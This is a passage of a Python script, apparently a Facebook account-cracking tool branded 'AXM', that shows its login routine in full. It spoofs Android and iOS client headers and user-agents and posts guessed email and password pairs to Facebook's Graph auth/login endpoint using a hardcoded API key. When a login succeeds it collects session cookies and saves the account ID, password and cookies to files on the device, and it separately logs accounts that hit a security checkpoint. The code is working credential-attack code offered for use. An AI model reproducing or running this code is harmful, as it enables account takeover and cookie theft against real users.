[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/213310081;FBCR/alfa;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8142;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=2.625,width=2434,height=1096};FBLC/zh_HK;FBRV/334731776;FBCR/my best phone;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AT52;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]'
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'api_key':'c1e620fa708a1d5696fb991c1bde5662',
                'community_id':'',
                'device_id':str(uuid.uuid4()),
                'family_device_id':str(uuid.uuid4()),
                'currently_logged_in_userid':'0',
                'try_num':'1',
                'email':ids,
                'password':pas,
                'generate_analytics_claim':'1',
                'cpl':'true',
                'generate_session_cookies':'1',
                'credentials_type':'password',
                'error_detail_type':'button_with_disabled',
                'source':'auth.login',
                'locale':'en_US',
                'client_country_code':'US',
                'advertising_id':str(uuid.uuid4()),
                'meta_inf_fbmeta':'NO_FILE',
                'access_token':access_token}
                head = {
                'Authorization':'OAuth '+access_token,
                'Host': 'b-graph.facebook.com',
                'X-FB-Connection-Quality':'EXCELLENT',
                'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                'x-fb-net-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                'x-fb-friendly_name':'authenticate',
                'content-encoding':'application/x-www-form-urlencoded',
                'x-tigon-is_retry':'true',
                'x-fb-http-engine':'Liger',
                'x-requested-with':'FBIOS',
                'connection':'keep-alive',
                'user-agent':ua}
                po = session.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"
                    print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                    open('/sdcard/AXM-FILE-M4-OK.txt', 'a').write(ids+'|'+pas+"\n")
                    open('/sdcard/AXM-FILE-M4-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                    ok.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\033[1;33m [AXM-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/AXM-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                    cp.append(ids)
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass
__Main_all_sys___for__run__().___file__RanD_All__()
